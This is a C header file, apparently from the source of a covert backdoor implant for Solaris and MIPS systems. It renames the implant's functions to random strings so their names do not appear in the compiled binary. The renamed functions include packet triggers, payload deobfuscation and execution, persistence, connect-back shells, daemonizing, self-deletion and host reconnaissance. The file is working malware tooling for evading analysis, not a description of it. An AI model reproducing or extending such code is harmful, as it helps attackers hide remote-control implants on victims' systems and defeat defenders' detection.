
// some linkers do not strip all symbols (function names) from the resulting binaries
// this condition is typical for Solaris and some MIPS compilers/linkers
// symbols defined in this file will be changed before the compilation process to
// ensure the resulting binary does contain these function names as strings

#if defined SOLARIS || defined _MIPS
#ifndef __SOLARONLY_H
#define __SOLARONLY_H

#define GetSystemUpTime GSUT

//Beacon.h 
#define beacon pb
#define beacon_start bs

//triggers
#define dt_find_interface_and_bind ardhyw4kj56
#define dt_error_received rhmrwltj5
#define dt_tftp_received a34ypo5yqu
#define dt_ping_reply_received asfhklwy
#define dt_get_socket_fd atjajlr
#define dt_signature_check drshsrma
#define dt_exec_payload knxNurt
#define dt_create_env dceAd
#define dt_ping_request_received adhyjks2a
#define dt_dns_received adhekmar
#define dt_raw_udp osftjjxe
#define dt_raw_tcp jkfjdjnt
#define dt_deobfuscate_payload hdsdglrmxs
#define dt_create_raw_socket dhmdtsjmsfdir
#define dt_bind_raw_socket adhmxkfrsbf
#define dt_free_ifi_info kidthldfvg
#define sniff_read_solaris stjsmrkw
#define sniff_start_solaris  sdhjdhSkdwgery
#define deobfuscate_payload akduwer247
#define raw_check odyt5930f
#define payload_to_trigger_info pttinf

#define TriggerListen srtjwrJwjw65jkw5ssfhr
#define GetMacAddr rtjsksE5yybt
#define EnablePersistence lkraodjYtsoe67w
//#define VerifyBytesWithHiddenData kkrdyQ4alzs5
#define PKT_TIMEOUT kkzDrhrksrfo2p
#define OPT_STRING dtHs3le5wkw
//#define base64_encode ywreoeREgt2fzxf
#define b64_decode_message sGffjldkrse2fs
#define connectbackListen ljarnoadthgnma3egn 

#define TriggerDelay nyJlTIma
#define GenRandomBytes TuJVovum
#define addrtostring WHUFrgYw
#define start_triggered_connect PzrBCyWA
#define StartClientSession YDKyYKdr
#define TriggerCallbackSession oJqCfTOd
#define CalcVariance sVXspNfE
#define run_command PtvsecPs
#define CMD_TIMEOUT NAFwQVVU
#define get_process_list TaFiCPBn
#define get_ifconfig fMOxIlaJ
#define get_netstat_rn XDyGtIJL
#define get_netstat_an fXeIVLrm
#define fork_process qPkbUxBK
#define daemonize ueMfGdir

#define release_netstat_rn rnwaetr
#define release_process_list drtie5wf
#define release_netstat_an dftr7itd7i
#define release_ifconfig sruiwi5rs6

//self delete
#define self_delete kfoyphs
#define check_timer kasgr453j
#define update_file uasgrwlwt456

//lauchShell
#define launchShell lsirter5

//jshell
#define jshell jsiwet23

//threads
#define terminate_thread tewry25t

#endif //__SOLARONLY_H

#endif //SOLARIS
